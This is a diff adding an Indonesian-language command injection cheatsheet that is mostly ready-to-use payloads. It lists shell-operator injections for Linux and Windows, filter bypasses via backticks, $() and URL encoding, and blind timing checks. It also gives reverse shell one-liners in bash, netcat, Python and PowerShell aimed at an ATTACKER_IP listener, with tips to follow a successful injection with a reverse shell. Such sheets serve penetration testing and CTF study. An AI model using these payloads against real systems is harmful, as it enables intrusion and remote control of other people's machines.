@@ -1,0 +1,88 @@
+
+
+# COMMAND INJECTION CHEATSHEET
+
+1. Konsep Dasar
+
+---
+
+Command Injection terjadi ketika input user dimasukkan langsung ke perintah sistem (system, exec, os.system, dll) tanpa validasi.
+Eksploitasi → menyisipkan operator shell untuk mengeksekusi perintah tambahan.
+
+2. Payload Dasar (Linux)
+
+---
+
+; ls
+&& ls
+\| ls
+; id
+&& whoami
+\| uname -a
+
+3. Payload Dasar (Windows)
+
+---
+
+& dir
+&& whoami
+\| type C:\Windows\win.ini
+
+4. Payload Menggabungkan Perintah
+
+---
+
+Ping + Command Injection:
+127.0.0.1; id
+127.0.0.1 && whoami
+127.0.0.1 | uname -a
+
+5. Bypass Filter (Encoding / Obfuscation)
+
+---
+
+Gunakan tanda backticks (Linux):
+`whoami`
+
+Gunakan \$():
+\$(id)
+
+Hex / URL Encoding:
+%26%26id
+%7Cwhoami
+
+6. Reverse Shell via Command Injection
+
+---
+
+Listener di attacker:
+nc -lvnp 4444
+
+Payload di target (Linux):
+; bash -i >& /dev/tcp/ATTACKER\_IP/4444 0>&1
+; nc -e /bin/bash ATTACKER\_IP 4444
+; python -c 'import socket,subprocess,os;s=socket.socket();s.connect(("ATTACKER\_IP",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(\["/bin/sh","-i"]);'
+
+Payload di target (Windows, pakai PowerShell):
+; powershell -NoP -NonI -W Hidden -Exec Bypass -c "New-Object System.Net.Sockets.TCPClient('ATTACKER\_IP',4444);\$stream=\$client.GetStream();\[byte\[]]\$bytes=0..65535|%{0};while((\$i=\$stream.Read(\$bytes,0,\$bytes.Length)) -ne 0){;\$data=(New-Object -TypeName System.Text.ASCIIEncoding).GetString(\$bytes,0,\$i);\$sendback=iex \$data 2>&1|Out-String;\$sendback2=\$sendback+'PS ';\$sb=\[text.encoding]::ASCII.GetBytes(\$sendback2);\$stream.Write(\$sb,0,\$sb.Length);\$stream.Flush()}"
+
+7. Deteksi Command Injection
+
+---
+
+* Perbedaan respon (sukses/gagal) saat menambahkan operator ( ; && | ).
+* Respon delay (uji dengan sleep):
+  ; sleep 5
+  && ping -c 5 127.0.0.1
+
+8. Tips Praktis
+
+---
+
+* Mulai dengan payload sederhana (; id, && whoami).
+* Coba berbagai operator: ; && | \` \$() &.
+* Gunakan time delay (sleep, ping) jika output tidak tampil (blind command injection).
+* Setelah berhasil → stabilkan dengan reverse shell.
+* Dokumentasikan command, respon, dan shell yang didapat.
+
+---
